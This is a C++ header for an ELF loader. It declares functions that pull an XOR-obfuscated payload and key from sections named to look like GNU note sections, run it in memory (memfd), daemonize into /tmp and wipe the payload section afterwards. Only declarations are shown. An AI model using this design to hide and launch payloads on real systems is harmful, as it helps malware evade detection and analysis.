//
// Created by dev on 1/3/22.
//

#ifndef ELFLDR_H
#define ELFLDR_H


// Headers
#include <iostream>
#include <string>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <csignal>
#include <cstdint>

#include <cstdlib>
#include <cerrno>
#include <climits>
#include <filesystem>

//Vendor
#include "elfioutil.h"
extern "C" {
    #include "libreflect/reflect.h"
    #include "lsecutil/lsecutil.h"
}

// Function declarations
typedef void ( *mem_exec )(unsigned char const  * p_data, char *** args);

std::filesystem::path get_executable_path();
bool find_section_by_name(ELFIO::elfio& r, const char * sec_name, unsigned int* sec_num, unsigned long* sec_size);
void read_section_data_to_buffer(ELFIO::elfio& r, char** data, unsigned int sec_num, ELFIO::Elf_Xword sec_sz);
unsigned int get_section_entries_n(ELFIO::elfio& r, unsigned int sec_num);
bool get_ksection_data(ELFIO::elfio& r, unsigned int ksec_num,
                       void ** key_data, ELFIO::Elf_Word * key_data_sz,
                       void ** algo_data, ELFIO::Elf_Word * algo_data_sz);

bool get_psection_data(ELFIO::elfio& r, unsigned int psec_num,
                       void ** p_data, ELFIO::Elf_Word * p_data_sz);

void clean_psection_data( unsigned int psec_num, const char * dst_elf_file);
void daemonize( mem_exec fp, bool memfd_method, unsigned char const  * p_data, char *** args);
void load_exec( bool memfd_method, unsigned char const  * p_data, char *** args);
void set_exec_args( char *** new_argv, char *** argv, int argc, int skip_pos );
unsigned int find_x_key( void ** key_data );

// Defines and macros
#ifndef PSEC_NAME
#define PSEC_NAME ".note.gnu.buf[...]"
#define PSEC_NENTRY 1
#endif

#ifndef KSEC_NAME
#define KSEC_NAME ".note.gnu.buf" // section with expected keys
#define KSEC_NENTRY 2       // minimal number of entries expected
#define KSEC_BITSHIFT_POS 2 // shifting by X positions
#define KSEC_CANARY_CHAR 0x90 // used for XOR bruteforce
#endif

#ifndef DAEMON_CHDIR
#define DAEMON_CHDIR "/tmp" // where daemon chdir() to
#endif

#ifndef DEBUG
#define DEBUG 1 // 1 - on, 0 - off

#define DEBUG_PAYDUMPF 0 // Dump paylaod to local file
#define PAYDUMPF "/tmp/dmp"

#define dprint(fmt, ...) \
        do { if (DEBUG == 1) fprintf(stderr, "%s:%d:%s(): " fmt, __FILE__, \
                                __LINE__, __func__, ##__VA_ARGS__); } while (0)
#endif


#endif //ELFLDR_H

